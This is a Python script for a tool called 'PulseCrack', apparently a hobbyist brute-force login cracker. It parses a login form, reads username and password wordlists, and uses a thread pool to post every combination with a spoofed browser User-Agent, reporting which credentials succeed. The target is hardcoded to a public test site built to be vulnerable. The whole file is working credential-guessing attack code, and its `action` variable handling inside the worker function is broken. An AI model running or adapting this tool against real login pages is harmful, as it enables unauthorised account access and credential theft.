import requests
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import rich 
from rich import print
import re
from time import sleep

#from rich import input

print('''
      [bold magenta]
   __________        .__                  _________                          __     
\______   \ __ __ |  |    ______  ____ \_   ___ \_______ _____     ____  |  | __ 
 |     ___/|  |  \|  |   /  ___/_/ __ \/    \  \/\_  __ \\__  \  _/ ___\ |  |/ / 
 |    |    |  |  /|  |__ \___ \ \  ___/\     \____|  | \/ / __ \_\  \___ |    <  
 |____|    |____/ |____//____  > \___  >\______  /|__|   (____  / \___  >|__|_ \ 
                             \/      \/        \/             \/      \/      \/ 
  [/bold magenta]
  [yellow]PulseCrack Brute Force Attack: v1.0[/yellow]              [bold]dev: Dev Cansado: https://github.com/rafaellima-py/[/bold]
                                                                                    
''')

try:
    website = 'http://testphp.vulnweb.com/login.php'#str(input('Enter the website Login Page: '))
    request = requests.post(website)
    if request.status_code == 200:
        print('[bold green]Successful connection[/bold green]\n\n')
    else:
        print('[bold red]Connection error[/bold red]')
        exit()
except:
    print('[bold red]Website not Found. Try: https://www.exemple.com[/bold red]')
    exit()

threads = 5
timeout = 2
soup = BeautifulSoup(request.text, 'html.parser')
form = soup.find_all('form')
action = [elements.get('action') for elements in form]
input_html = soup.find_all('input')
inputs = [elements.get('name') for elements in input_html if elements.get('type') == 'text' or elements.get('type') == 'password'] 
token = False
list_user = []
list_pass = []


if action == ['']:
    print('[bold red] Parameter Action not found.[/bold red]')
    action =  input(' Manually enter: ')
if len(action) >=2:
    print('[bold yellow] More than one action has been found, which one do you want to use?[/bold yellow]\n\n','\nList Actions:\n','\n'.join(action))
    action = 'userinfo.php'#input('\nManually enter: ') 
if type(action) == list:
    regex = re.compile(r'token')
    resultado = bool(regex.search(action[0]))
    if resultado:
        token = True
        action = action[0]
    
else:
    regex = re.compile(r'token')
    resultado = bool(regex.search(action))
    if resultado:
        token = True

username_confirm = ''#input(f'input username html identified: [{inputs[0]}] press enter to keep, or enter manually:  ')
pass_confirm = ''#input(f'input password html identified: [{inputs[1]}] press enter to keep, or enter manually:  ')
error_message  = 'If you are already registered please enter your login information below:'#input(f'enter error message in html:  ')
confirm_threads = ''#input(f'threads  default: [{threads}] press enter to keep, or enter manually:  ')
confirm_timeout = ''#input(f'timeout  default: [{timeout}] press enter to keep, or enter manually:  ')
wordlist_user = 'wordlist_user.txt'#input(f'enter directory wordlist username txt:  ')
wordlist_pass = 'wordlist_pass.txt'#input(f'enter directory wordlist password txt:  ')

with open(wordlist_user, 'r') as file:
    for w_user in file:
        list_user.append(w_user.strip())        
with open(wordlist_pass, 'r') as file:
    for w_pass in file:
        list_pass.append(w_pass.strip())
        
if username_confirm != '':
    inputs[0] = username_confirm
if pass_confirm != '':
    inputs[1] = pass_confirm
if confirm_threads != '':
    threads = int(confirm_threads)
if confirm_timeout != '':
    timeout = int(confirm_timeout)

    
def brute_force(credenciais):
    user, passw = credenciais
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    data = {inputs[0]: user, inputs[1]: passw}
    
    re_http = re.compile(r'http')
    res_http = bool(re_http.search(action[0]))
    if res_http:
        print('tem http no action')
    else:
        action = f'{website}/{action}'
        print('colocando http no action')
        print(action)
    try:
        request = requests.post(action, data=data, headers=headers, timeout=2)
        if error_message in request.text:
            print(f'[bold red]Testing credencials: {user}: {passw}, faill[/bold red]')
        else:
            print(f'[bold green]Testing credencials: {user}: {passw}, success[/bold green]')
            exit()
    except Exception as e:
        print(e)
        
with ThreadPoolExecutor(max_workers=threads) as executor:
    login_credencials = [(user, password) for user in list_user for password in list_pass]
    executor.map(brute_force, login_credencials)
    
    